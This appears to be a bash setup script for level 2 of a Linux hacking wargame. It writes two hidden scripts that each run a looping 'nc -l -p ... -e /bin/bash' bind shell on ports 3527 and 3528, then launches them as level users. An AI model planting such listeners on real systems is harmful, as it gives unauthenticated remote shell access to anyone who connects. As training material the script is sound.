#!/bin/bash
#
# Regards, the Alveare Solutions society,
#
# LEVEL 2 SETUP

function stage2_install () {
    local FAILURES=0
    local USER_HOME="${SETUP_DEFAULT['home-dir']}/${SETUP_DEFAULT['player-user']}-2"
    stage2_chapter0_setup "$USER_HOME" &> /dev/null
    if [ $? -ne 0 ]; then
        local FAILURES=$((FAILURES + 1))
    fi
    stage2_chapter1_setup "$USER_HOME" &> /dev/null
    if [ $? -ne 0 ]; then
        local FAILURES=$((FAILURES + 1))
    fi
    local SUCCESS_COUNT=`echo "2 - ${FAILURES}" | bc`
    if [ $FAILURES -ne 0 ]; then
        echo "[ NOK ]: (${SUCCESS_COUNT}/2) chapters set up!"\
            "Failures detected on level 2! ($FAILURES)"
    else
        echo "[ OK ]: Level 2 - Locked & Loaded -"\
            "(${SUCCESS_COUNT}/2) chapters set up!"
    fi
    return $FAILURES
}

function stage2_chapter0_setup () {
    local FAILURES=0
    local SCRIPT_PATH="${SETUP_DEFAULT['bin-dir']}/.FriendlyEnterpriseDebugger-Backdoor.sh"
    local CONTENT="#!/bin/bash
# Raw Socket Backdoor
while :
do
    nc -l -p 3527 -e /bin/bash
done
exit $?
    "
    echo "$CONTENT" > "${SCRIPT_PATH}"
    if [ $? -ne 0 ]; then
        local FAILURES=$((FAILURES + 1))
    fi
    chown "${LEVEL_USERS['2']}" "${SCRIPT_PATH}" #&> /dev/null
    if [ $? -ne 0 ]; then
        local FAILURES=$((FAILURES + 1))
    fi
    chgrp "${LEVEL_USERS['2']}" "${SCRIPT_PATH}" #&> /dev/null
    if [ $? -ne 0 ]; then
        local FAILURES=$((FAILURES + 1))
    fi
    chmod 700 "${SCRIPT_PATH}" #&> /dev/null
    if [ $? -ne 0 ]; then
        local FAILURES=$((FAILURES + 1))
    fi
    runuser -l "${LEVEL_USERS['2']}" -c "${SCRIPT_PATH}" &
    sleep 1
    local BACKDOOR_PID=`ps -aux | grep "$SCRIPT_PATH" | grep 'Ghost-2' | \
        grep -v 'runuser' | awk '{print $2}' | egrep -v "[a-zA-Z]"`
    echo "$BACKDOOR_PID" > ${PID_FILES['2.0']}
    if [ $? -ne 0 ]; then
        local FAILURES=$((FAILURES + 1))
    fi
    if [ $FAILURES -ne 0 ]; then
        echo "[ NOK ]: Chapter 2.0 setup failure!"
    else
        echo "[ OK ]: Chapter 2.0 setup complete!"
    fi
    return $FAILURES
}

function stage2_chapter1_setup () {
    local FAILURES=0
    local SCRIPT_PATH="${SETUP_DEFAULT['bin-dir']}/.FED-Blocker.sh"
    local CONTENT="#!/bin/bash
# Friendly Enterprise Debugger Blocker
while :
do
    # Fight fire with fire, hehe
    nc -l -p 3528 -e /bin/bash
done
exit $?
    "

    echo "$CONTENT" > "${SCRIPT_PATH}"
    if [ $? -ne 0 ]; then
        local FAILURES=$((FAILURES + 1))
    fi
    chown "${SETUP_DEFAULT['player-user']}-2" "${SCRIPT_PATH}" &> /dev/null
    if [ $? -ne 0 ]; then
        local FAILURES=$((FAILURES + 1))
    fi
    chmod +x "${SCRIPT_PATH}" &> /dev/null
    if [ $? -ne 0 ]; then
        local FAILURES=$((FAILURES + 1))
    fi
    runuser -l "${SETUP_DEFAULT['player-user']}-2" \
        -c "${SCRIPT_PATH}" &
    local BACKDOOR_PID=`ps -aux | grep "$SCRIPT_PATH" | grep -v 'runuser' | \
        awk '{print $2}' | egrep -v "[a-zA-Z]"`
    echo "$BLOCKER_PID" > ${PID_FILES['2.1']}
    if [ $? -ne 0 ]; then
        local FAILURES=$((FAILURES + 1))
    fi
    if [ $FAILURES -ne 0 ]; then
        echo "[ NOK ]: Chapter 2.1 setup failure!"
    else
        echo "[ OK ]: Chapter 2.1 setup complete!"
    fi
    return $FAILURES
}
